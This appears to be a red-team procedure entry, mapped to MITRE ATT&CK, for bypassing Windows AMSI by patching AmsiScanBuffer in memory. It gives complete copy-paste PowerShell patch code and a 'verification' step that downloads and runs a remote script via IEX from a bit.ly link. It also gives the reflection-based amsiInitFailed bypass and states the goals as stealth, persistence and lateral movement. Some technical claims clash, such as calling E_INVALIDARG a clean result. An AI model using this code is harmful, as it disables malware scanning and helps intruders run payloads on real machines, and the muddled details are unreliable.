---
id: 854d951b-be94-496b-8f28-cc997a2d9d02
name: Patch-AmsiScanBuffer-in-Memory-to-Bypass-AMSI
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:25.920352+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
techniques:
  - >-
    [[techniques/Impair-Defenses-Disable-or-Modify-Tools|T1562 - Impair
    Defenses: Disable or Modify Tools]]
sub_techniques:
  - >-
    [[sub-techniques/Impair-Defenses-Disable-or-Modify-Tools|T1562.001 - Disable
    or Modify Tools]]
tags:
  - amsi-bypass
  - patching
  - powershell
  - defense-evasion
  - rasta-mouse
commands: []
platforms:
  - Windows
tools: []
validated: true
---

# Patch-AmsiScanBuffer-in-Memory-to-Bypass-AMSI

## Summary

This procedure patches the AmsiScanBuffer function in the memory of the amsi.dll library using PowerShell and Windows API calls. By modifying the function to always return AMSI_RESULT_CLEAN (value 0x80070057, E_INVALIDARG), it bypasses the Antimalware Scan Interface (AMSI), allowing malicious PowerShell scripts to execute without detection by Windows Defender or other AMSI-integrated security products.

## Description

AMSI is a Windows interface that allows applications like PowerShell to scan content for malware before execution. The AmsiScanBuffer function performs the actual scanning. This technique, popularized by security researcher rasta-mouse, uses .NET reflection and P/Invoke to locate the function in memory, change its protection to writable, and overwrite the first bytes with machine code that forces a clean result. This is an in-memory patch, requiring no file modifications or reboots, and works in the context of the current PowerShell process. It is commonly used in red team engagements to evade detection during script-based attacks on Windows systems running PowerShell 5.0 or later with AMSI enabled. Note that this bypass is process-specific and does not affect other processes.

## Requirements

1. Windows 10 or later with PowerShell 5.1+ (AMSI enabled by default)
2. Execution policy allowing script execution (e.g., Bypass or Unrestricted; can be set temporarily with Set-ExecutionPolicy)
3. No administrative privileges required, as the patch is in-process memory modification
4. Target process must load amsi.dll (PowerShell does this on demand)

## Defense

- Enable PowerShell logging (Module, Script Block, and Transcription logging) to capture suspicious API calls and script execution
- Monitor for VirtualProtect calls targeting amsi.dll addresses using EDR tools or Sysmon (Event ID 8 for process access changes)
- Implement application control (e.g., AppLocker or WDAC) to restrict PowerShell execution to signed scripts
- Use behavioral analytics to detect unusual memory modifications in PowerShell processes
- Keep Windows and Defender updated, as Microsoft has hardened AMSI against such patches in newer versions (e.g., via CFG and ETW)

## Objectives

1. Disable AMSI scanning in the current PowerShell session to allow execution of obfuscated or malicious scripts
2. Evade detection by integrated antivirus solutions during post-exploitation activities
3. Maintain stealth for further persistence or lateral movement without triggering alerts

## Instructions

### Step 1: Define Win32 API Imports

**Context**: Load a C# class using Add-Type to import necessary kernel32.dll functions for memory manipulation. This enables getting module handles, procedure addresses, and changing memory protection.

**Code** ([[codes/PowerShell-Patch-AmsiScanBuffer]]):

Embed the patching code here for direct execution, or save as a .ps1 file and dot-source it.

> This step prepares the environment for the memory patch. Expected output: No visible output if successful; errors if amsi.dll is not loaded or API calls fail.

### Step 2: Execute the Memory Patch

**Context**: Retrieve the address of AmsiScanBuffer, make the memory writable, and overwrite the function prologue with bytes that return a clean scan result (mov eax, 0x80070057; ret). This neutralizes AMSI for subsequent scans in the session.

**Code** ([[codes/PowerShell-Patch-AmsiScanBuffer]]):

Run the full patching script provided in the referenced code.

```powershell
# The full code from [[codes/PowerShell-Patch-AmsiScanBuffer]] goes here for copy-paste
$win32 = @'
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
'@ 
Add-Type $win32 
$amsi = [Win32]::GetModuleHandle('amsi.dll') 
$func = [Win32]::GetProcAddress($amsi, 'AmsiScanBuffer') 
$pbytes = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) 
[Win32]::VirtualProtect($func, [UInt32]6, 0x40, [Ref]$null) 
[System.Runtime.InteropServices.Marshal]::Copy($pbytes, 0, $func, 6)
```

> After execution, test the bypass by running a known malicious script (e.g., one that would normally trigger AMSI). Expected output: No blocking; script executes freely. If patching fails, check for errors like 'Access denied' (rare in user context).

### Step 3: Verify the Bypass

**Context**: Confirm AMSI is disabled by attempting to execute content that AMSI would flag, such as a simple obfuscated command.

**Instructions**: Run a test like `IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/malicious')` or a local flagged script. Alternatively, use `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` as an alternative check, but the patch should allow execution without errors.

> Expected output: Script runs without AMSI blocking messages like 'script execution was blocked due to execution policy' or malware alerts. Success if no intervention from Defender.
